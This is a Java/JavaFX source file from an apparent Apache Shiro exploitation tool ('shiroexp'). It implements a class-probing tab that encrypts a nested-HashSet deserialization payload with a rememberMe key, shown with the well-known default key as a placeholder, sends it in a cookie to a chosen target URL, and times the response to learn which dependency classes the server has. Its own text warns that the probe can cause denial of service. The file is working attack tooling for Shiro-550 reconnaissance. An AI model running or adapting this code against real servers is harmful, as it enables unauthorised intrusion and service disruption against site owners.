package com.y5neko.shiroexp.ui.tabpane;

import com.y5neko.shiroexp.config.AllList;
import com.y5neko.shiroexp.gadget.FindClassByBomb;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;

import java.util.HashMap;
import java.util.Map;

/**
 * FindClassByBomb 类探测 Tab
 * 通过嵌套 HashSet 探测目标是否存在指定依赖类
 *
 * 原理：构造深层嵌套的 HashSet 结构，反序列化时会触发深层次类查找
 * - 如果目标存在该类：反序列化成功，响应延迟明显增加
 * - 如果目标不存在该类：反序列化失败，响应延迟较短
 *
 * 请通过对比响应时间差来判断类是否存在
 */
public class FindClassByBombTab {
    // 静态引用，用于外部更新UI
    private static FindClassByBombTab instance;

    private TextField targetUrlTextField;
    private ComboBox<String> requestTypeComboBox;
    private TextField rememberMeTextField;
    private TextField rememberMeFlagTextField;
    private TextField cookieTextField; // Cookie 字段
    private ComboBox<String> contentTypeComboBox; // Content-Type 下拉框
    private TextField requestBodyTextField; // 请求体输入框
    private TextField classFilterTextField; // 探测类过滤输入框
    private ComboBox<String> cryptTypeComboBox;
    private ComboBox<String> classComboBox; // 探测类下拉列表
    private TextField depthTextField; // 嵌套深度输入框
    private ObservableList<String> allClasses; // 保存完整的类列表，用于过滤
    private TextArea logTextArea; // 日志文本框

    /**
     * 追加日志并自动滚动到底部的辅助方法
     */
    private void appendLogWithScroll(TextArea logTextArea, String text) {
        logTextArea.appendText(text);
        logTextArea.setScrollTop(Double.MAX_VALUE);
    }

    public VBox getFindClassByBombTab() {
        // 注册实例
        instance = this;

        VBox bombTab = new VBox();
        bombTab.setSpacing(10);
        bombTab.setPadding(new Insets(10));
        bombTab.getStylesheets().add("css/TextField.css");

        // ========================== 第一行：目标地址配置 ==========================
        HBox targetUrlBox = new HBox();
        targetUrlBox.setAlignment(Pos.CENTER);
        targetUrlBox.setSpacing(10);
        targetUrlBox.setPadding(new Insets(0, 0, 10, 0));

        Label requestTypeLabel = new Label("请求方式: ");
        ObservableList<String> requestType = FXCollections.observableArrayList("GET", "POST");
        requestTypeComboBox = new ComboBox<>(requestType);
        requestTypeComboBox.setValue("GET");

        Label targetUrlLabel = new Label("目标地址:");
        targetUrlTextField = new TextField();
        targetUrlTextField.setPromptText("http://example.com");
        HBox.setHgrow(targetUrlTextField, javafx.scene.layout.Priority.ALWAYS);

        targetUrlBox.getChildren().addAll(requestTypeLabel, requestTypeComboBox, targetUrlLabel, targetUrlTextField);

        // ========================== 第二行：RememberMe 配置 ==========================
        HBox rememberMeConfigBox = new HBox();
        rememberMeConfigBox.setAlignment(Pos.CENTER);
        rememberMeConfigBox.setSpacing(10);
        rememberMeConfigBox.setPadding(new Insets(0, 0, 10, 0));

        Label rememberMeKeywordLabel = new Label("Keyword: ");
        rememberMeFlagTextField = new TextField("rememberMe");
        HBox.setHgrow(rememberMeFlagTextField, javafx.scene.layout.Priority.ALWAYS);

        Label rememberMeValueLabel = new Label("指定rememberMe: ");
        rememberMeTextField = new TextField();
        rememberMeTextField.setPromptText("kPH+bIxk5D2deZiIxcaaaA==");
        HBox.setHgrow(rememberMeTextField, javafx.scene.layout.Priority.ALWAYS);

        Label cryptTypeLabel = new Label("加密方式: ");
        ObservableList<String> cryptType = FXCollections.observableArrayList("CBC", "GCM");
        cryptTypeComboBox = new ComboBox<>(cryptType);
        cryptTypeComboBox.setValue("CBC");
        Tooltip tooltip = new Tooltip();
        tooltip.setText("Shiro1.4.2版本后,Shiro的加密模式\n由AES-CBC变为AES-GCM");
        Tooltip.install(cryptTypeComboBox, tooltip);

        Label depthLabel = new Label("嵌套深度:");
        depthTextField = new TextField("23");
        depthTextField.setPrefWidth(60);
        Tooltip depthTooltip = new Tooltip();
        depthTooltip.setText("HashSet 嵌套深度\n深度越大，探测越准确，但 payload 体积也越大\n默认 23");
        Tooltip.install(depthTextField, depthTooltip);

        rememberMeConfigBox.getChildren().addAll(rememberMeKeywordLabel, rememberMeFlagTextField,
                rememberMeValueLabel, rememberMeTextField, cryptTypeLabel, cryptTypeComboBox,
                depthLabel, depthTextField);

        // ========================== 第三行：探测类配置 ==========================
        HBox classConfigBox = new HBox();
        classConfigBox.setAlignment(Pos.CENTER);
        classConfigBox.setSpacing(10);
        classConfigBox.setPadding(new Insets(0, 0, 10, 0));

        Label classLabel = new Label("探测类名:");
        classFilterTextField = new TextField();
        classFilterTextField.setPromptText("输入关键字过滤类名");
        HBox.setHgrow(classFilterTextField, javafx.scene.layout.Priority.ALWAYS);

        Label comboBoxLabel = new Label("选择类:");
        allClasses = AllList.getAllUrlDnsClasses();
        classComboBox = new ComboBox<>(allClasses);
        classComboBox.setPrefWidth(400);

        // 类名过滤功能
        classFilterTextField.textProperty().addListener((observable, oldValue, newValue) -> {
            filterClasses(newValue);
        });

        classConfigBox.getChildren().addAll(classLabel, classFilterTextField, comboBoxLabel, classComboBox);

        // ========================== 第四行：高级配置 ==========================
        TitledPane advancedConfigPane = new TitledPane();
        advancedConfigPane.setText("高级配置");
        advancedConfigPane.setCollapsible(true);
        advancedConfigPane.setExpanded(false);

        VBox advancedConfigContent = new VBox();
        advancedConfigContent.setSpacing(10);
        advancedConfigContent.setPadding(new Insets(10, 0, 10, 0));

        HBox cookieBox = new HBox();
        cookieBox.setAlignment(Pos.CENTER);
        cookieBox.setSpacing(10);

        Label cookieLabel = new Label("Cookie:");
        cookieTextField = new TextField();
        cookieTextField.setPromptText("例: key=value; key2=value2");
        HBox.setHgrow(cookieTextField, javafx.scene.layout.Priority.ALWAYS);

        cookieBox.getChildren().addAll(cookieLabel, cookieTextField);
        advancedConfigContent.getChildren().add(cookieBox);

        // Content-Type 和请求体配置（同一行）
        HBox contentTypeAndBodyBox = new HBox();
        contentTypeAndBodyBox.setAlignment(Pos.CENTER);
        contentTypeAndBodyBox.setSpacing(10);

        Label contentTypeLabel = new Label("Content-Type: ");
        ObservableList<String> contentTypes = FXCollections.observableArrayList(
            "application/x-www-form-urlencoded",
            "application/json",
            "multipart/form-data",
            "text/plain",
            "application/xml"
        );
        contentTypeComboBox = new ComboBox<>(contentTypes);
        contentTypeComboBox.setValue("application/x-www-form-urlencoded");
        HBox.setHgrow(contentTypeComboBox, javafx.scene.layout.Priority.ALWAYS);

        Label requestBodyLabel = new Label("请求体: ");
        requestBodyTextField = new TextField();
        requestBodyTextField.setPromptText("POST 时生效 (例: {\"key\":\"value\"})");
        HBox.setHgrow(requestBodyTextField, javafx.scene.layout.Priority.ALWAYS);

        contentTypeAndBodyBox.getChildren().addAll(contentTypeLabel, contentTypeComboBox, requestBodyLabel, requestBodyTextField);
        advancedConfigContent.getChildren().add(contentTypeAndBodyBox);

        advancedConfigPane.setContent(advancedConfigContent);

        // ========================== 第五行：操作按钮 ==========================
        HBox buttonBox = new HBox();
        buttonBox.setAlignment(Pos.CENTER);
        buttonBox.setSpacing(10);
        buttonBox.setPadding(new Insets(0, 0, 10, 0));

        Button sendButton = new Button("开始探测");
        sendButton.setOnAction(event -> handleSendBombRequest());

        buttonBox.getChildren().addAll(sendButton);

        // ========================== 第五行：日志区域 ==========================
        VBox logContainer = new VBox();
        logContainer.setSpacing(10);
        logContainer.setPadding(new Insets(10, 0, 0, 0));
        logContainer.setFillWidth(true);

        logTextArea = new TextArea();
        logTextArea.setEditable(false);
        logTextArea.setWrapText(true);
        logTextArea.setPromptText("FindClassByBomb适用于不出网或未配置DNS服务的情况，通过探测类的嵌套深度和响应的延时来判断类是否存在，如果类存在，嵌套深度越高延时越高。建议先通过多次正常请求判断正常请求时间，再逐渐增加嵌套深度来判断，防止造成DOS");

        // 按钮区域
        Button clearLogButton = new Button("清空日志");
        HBox logButtonBox = new HBox(10);
        logButtonBox.setAlignment(Pos.CENTER_RIGHT);
        logButtonBox.getChildren().add(clearLogButton);
        clearLogButton.setOnAction(event -> handleClearLog());

        // 组装日志区域：TextArea 占据所有可用空间，logButtonBox 固定在底部
        logContainer.getChildren().addAll(logTextArea, logButtonBox);

        // 关键：让 TextArea 在 logContainer 中占据所有剩余垂直空间
        VBox.setVgrow(logTextArea, javafx.scene.layout.Priority.ALWAYS);

        // 关键：让 logContainer 在主 VBox (bombTab) 中占据所有剩余垂直空间
        VBox.setVgrow(logContainer, javafx.scene.layout.Priority.ALWAYS);

        // ========================== 添加所有组件 ==========================
        bombTab.getChildren().addAll(targetUrlBox, rememberMeConfigBox, classConfigBox, advancedConfigPane, buttonBox, logContainer);

        return bombTab;
    }

    /**
     * 过滤类名列表
     */
    private void filterClasses(String filterText) {
        String lowerCaseFilter = filterText.toLowerCase();

        // 如果过滤文本为空，显示所有类
        if (lowerCaseFilter == null || lowerCaseFilter.isEmpty()) {
            classComboBox.setItems(allClasses);
            return;
        }

        // 过滤类名
        ObservableList<String> filteredList = FXCollections.observableArrayList();
        for (String className : allClasses) {
            if (className.toLowerCase().contains(lowerCaseFilter)) {
                filteredList.add(className);
            }
        }

        classComboBox.setItems(filteredList);

        // 如果过滤后只剩一个类，自动选中
        if (filteredList.size() == 1) {
            classComboBox.getSelectionModel().select(0);
        }
    }

    /**
     * 处理发送探测请求按钮
     */
    private void handleSendBombRequest() {
        // 验证输入
        String targetUrl = targetUrlTextField.getText().trim();
        if (targetUrl.isEmpty()) {
            appendLogWithScroll(logTextArea, "[EROR]请输入目标地址\n");
            return;
        }

        String rememberMe = rememberMeTextField.getText().trim();
        if (rememberMe.isEmpty()) {
            appendLogWithScroll(logTextArea, "[EROR]请输入指定rememberMe\n");
            return;
        }

        String className = classComboBox.getValue();
        if (className == null || className.isEmpty()) {
            appendLogWithScroll(logTextArea, "[EROR]请选择要探测的类\n");
            return;
        }

        String depthStr = depthTextField.getText().trim();
        int depth;
        try {
            depth = Integer.parseInt(depthStr);
            if (depth < 1 || depth > 50) {
                appendLogWithScroll(logTextArea, "[EROR]嵌套深度必须在 1-50 之间\n");
                return;
            }
        } catch (NumberFormatException e) {
            appendLogWithScroll(logTextArea, "[EROR]嵌套深度必须是有效的整数\n");
            return;
        }

        appendLogWithScroll(logTextArea, "========================================\n");
        appendLogWithScroll(logTextArea, "[INFO]开始发送探测请求\n");
        appendLogWithScroll(logTextArea, "[INFO]目标地址: " + targetUrl + "\n");
        appendLogWithScroll(logTextArea, "[INFO]探测类名: " + className + "\n");
        appendLogWithScroll(logTextArea, "[INFO]嵌套深度: " + depth + "\n");
        appendLogWithScroll(logTextArea, "----------------------------------------\n");

        // 在后台线程中执行
        Thread sendThread = new Thread(() -> {
            try {
                TargetOBJ targetOBJ = new TargetOBJ(targetUrl);
                targetOBJ.setKey(rememberMe);
                targetOBJ.setRememberMeFlag(rememberMeFlagTextField.getText().trim());

                // 获取加密方式
                String cryptType = cryptTypeComboBox.getValue();

                // 生成 payload
                byte[] payload = FindClassByBomb.genPayload(className, depth);
                String base64Payload = java.util.Base64.getEncoder().encodeToString(payload);

                String finalPayload;
                if ("CBC".equals(cryptType)) {
                    finalPayload = com.y5neko.shiroexp.misc.Tools.CBC_Encrypt(rememberMe, base64Payload);
                } else {
                    finalPayload = com.y5neko.shiroexp.misc.Tools.GCM_Encrypt(rememberMe, base64Payload);
                }

                // 提示用户正在等待响应
                Platform.runLater(() -> {
                    appendLogWithScroll(logTextArea, "[INFO]正在发送探测请求，等待响应...\n");
                    appendLogWithScroll(logTextArea, "----------------------------------------\n");
                });

                // 发送请求并记录响应时间
                long startTime = System.currentTimeMillis();
                ResponseOBJ response = sendRequest(targetOBJ, finalPayload);
                long responseTime = System.currentTimeMillis() - startTime;

                analyzeResponse(response, cryptType, responseTime);

                Platform.runLater(() -> appendLogWithScroll(logTextArea, "========================================\n"));

            } catch (Exception e) {
                Platform.runLater(() -> {
                    appendLogWithScroll(logTextArea, "[EROR]探测请求失败: " + e.getMessage() + "\n");
                    appendLogWithScroll(logTextArea, "[DEBUG]" + e.getClass().getSimpleName() + "\n");
                    appendLogWithScroll(logTextArea, "========================================\n");
                });
            }
        });

        sendThread.setDaemon(true);
        sendThread.start();
    }

    /**
     * 发送请求（FindClassByBomb 专用，设置较长超时时间）
     * 反序列化深层嵌套 HashSet 可能需要较长时间
     */
    private ResponseOBJ sendRequest(TargetOBJ targetOBJ, String payload) throws Exception {
        // 为 FindClassByBomb 设置 60 秒超时时间
        // 因为反序列化深层嵌套的 HashSet 可能需要很长时间（特别是类存在时）
        okhttp3.OkHttpClient client = new okhttp3.OkHttpClient.Builder()
                .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .build();

        Map<String, String> headers = new HashMap<>();
        // 构建 Cookie：包含 RememberMe 和额外的 Cookie
        String cookieValue = targetOBJ.getRememberMeFlag() + "=" + payload;
        if (cookieTextField != null && !cookieTextField.getText().trim().isEmpty()) {
            cookieValue += "; " + cookieTextField.getText().trim();
        }
        headers.put("Cookie", cookieValue);

        // 应用 Content-Type
        if (contentTypeComboBox != null && contentTypeComboBox.getValue() != null) {
            headers.put("Content-Type", contentTypeComboBox.getValue());
        }

        okhttp3.Request.Builder requestBuilder;
        String requestType = requestTypeComboBox.getValue();

        // 获取请求体
        String requestBody = null;
        if (requestBodyTextField != null && !requestBodyTextField.getText().trim().isEmpty()) {
            requestBody = requestBodyTextField.getText().trim();
        }

        if ("POST".equals(requestType)) {
            okhttp3.RequestBody body;
            if (requestBody != null && !requestBody.isEmpty()) {
                // 使用用户提供的请求体
                body = okhttp3.RequestBody.create(
                    okhttp3.MediaType.parse(contentTypeComboBox != null ? contentTypeComboBox.getValue() : "text/plain"),
                    requestBody
                );
            } else {
                // 默认空表单
                body = new okhttp3.FormBody.Builder().build();
            }
            requestBuilder = new okhttp3.Request.Builder()
                    .post(body)
                    .url(targetOBJ.getUrl());
        } else {
            requestBuilder = new okhttp3.Request.Builder()
                    .url(targetOBJ.getUrl());
        }

        headers.forEach(requestBuilder::header);
        okhttp3.Request request = requestBuilder.build();

        ResponseOBJ responseOBJ = new ResponseOBJ();
        try (okhttp3.Response response = client.newCall(request).execute()) {
            if (response.body() != null) {
                responseOBJ.setStatusCode(response.code());
                responseOBJ.setResponse(response.body().bytes());
                responseOBJ.setHeaders(response.headers());
                return responseOBJ;
            }
        } catch (java.io.IOException e) {
            throw new Exception("请求超时或失败: " + e.getMessage(), e);
        }
        return null;
    }

    /**
     * 分析响应
     * @param response HTTP 响应对象
     * @param cryptType 加密类型
     * @param responseTime 响应时间（毫秒）
     */
    private void analyzeResponse(ResponseOBJ response, String cryptType, long responseTime) {
        String responseBody = new String(response.getResponse());
        int statusCode = response.getStatusCode();

        Platform.runLater(() -> {
            appendLogWithScroll(logTextArea, "[INFO][" + cryptType + "] HTTP 状态码: " + statusCode + "\n");
            appendLogWithScroll(logTextArea, "[INFO][" + cryptType + "] 响应时间: " + responseTime + " ms\n");
        });
    }

    /**
     * 处理清空日志按钮
     */
    private void handleClearLog() {
        logTextArea.clear();
    }

    // =========================== 同步配置方法 ===========================

    /**
     * 从 Shiro550 Tab 更新配置（公共方法）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     * @param cookie 额外的Cookie
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType, String cookie) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, requestType, cookie, null, null);
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，包含所有高级配置）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     * @param cookie 额外的Cookie
     * @param contentType Content-Type值
     * @param requestBody 请求体值
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType, String cookie, String contentType, String requestBody) {
        if (targetUrlTextField != null && !targetUrl.trim().isEmpty()) {
            targetUrlTextField.setText(targetUrl);
        }
        if (rememberMeTextField != null && !key.trim().isEmpty()) {
            rememberMeTextField.setText(key);
        }
        if (rememberMeFlagTextField != null && !rememberMeFlag.trim().isEmpty()) {
            rememberMeFlagTextField.setText(rememberMeFlag);
        }
        if (cryptTypeComboBox != null && cryptType != null && !cryptType.trim().isEmpty()) {
            // 映射加密模式：如果传入"爆破所有"，默认使用 CBC
            String mappedCryptType = "CBC".equals(cryptType) || "GCM".equals(cryptType) ? cryptType : "CBC";
            cryptTypeComboBox.setValue(mappedCryptType);
        }
        if (requestTypeComboBox != null && requestType != null && !requestType.trim().isEmpty()) {
            requestTypeComboBox.setValue(requestType);
        }
        if (cookieTextField != null && cookie != null && !cookie.trim().isEmpty()) {
            cookieTextField.setText(cookie);
        }
        // 同步 Content-Type
        if (contentTypeComboBox != null && contentType != null && !contentType.trim().isEmpty()) {
            contentTypeComboBox.setValue(contentType);
        }
        // 同步请求体
        if (requestBodyTextField != null && requestBody != null && !requestBody.trim().isEmpty()) {
            requestBodyTextField.setText(requestBody);
        }
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，不包含加密模式和请求方式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, null, null, null);
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，包含加密模式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, null, null);
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，包含加密模式和请求方式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, requestType, null);
    }

    /**
     * 静态方法：更新当前实例的配置（包含所有参数）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     * @param cookie 额外的Cookie
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType, String cookie) {
        if (instance != null) {
            javafx.application.Platform.runLater(() -> {
                instance.updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, requestType, cookie);
            });
        }
    }

    /**
     * 静态方法：更新当前实例的配置（包含所有参数、Content-Type 和请求体）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     * @param cookie 额外的Cookie
     * @param contentType Content-Type值
     * @param requestBody 请求体值
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType, String cookie, String contentType, String requestBody) {
        if (instance != null) {
            javafx.application.Platform.runLater(() -> {
                instance.updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, requestType, cookie, contentType, requestBody);
            });
        }
    }

    /**
     * 静态方法：更新当前实例的配置（不包含加密模式和请求方式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag) {
        updateFromShiro550Static(targetUrl, key, rememberMeFlag, null, null, null);
    }

    /**
     * 静态方法：更新当前实例的配置（包含加密模式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType) {
        updateFromShiro550Static(targetUrl, key, rememberMeFlag, cryptType, null, null);
    }

    /**
     * 静态方法：更新当前实例的配置（包含加密模式和请求方式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType) {
        updateFromShiro550Static(targetUrl, key, rememberMeFlag, cryptType, requestType, null);
    }
}
